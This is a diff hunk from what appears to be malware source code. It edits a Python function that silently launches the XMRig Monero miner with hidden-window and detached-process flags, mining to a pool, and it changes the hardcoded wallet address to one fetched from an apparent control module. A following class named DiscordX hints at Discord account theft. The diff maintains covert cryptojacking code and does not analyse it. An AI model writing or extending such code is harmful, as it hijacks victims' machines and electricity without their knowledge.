@@ -2402,7 +2402,7 @@ def xmrig():
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
-    subprocess.Popen([xmrig_exe, "--donate-level", "1", "-o", "de.monero.herominers.com:1111", "-u", "49vfj17oFnshJpoX52tmacXhXd9ivUjdJC51fPUG8dFsXY8m39rTYj2TzrMWp7QwARP3QtBCKEqvkjDiYDMADD5PALx1XBu", "-p", get_random_string(12), "-a", "rx/0", "-k", "--background"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
+    subprocess.Popen([xmrig_exe, "--donate-level", "1", "-o", "de.monero.herominers.com:1111", "-u", cc.get_xmr_adress(), "-p", get_random_string(12), "-a", "rx/0", "-k", "--background"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
 
 
 class DiscordX:
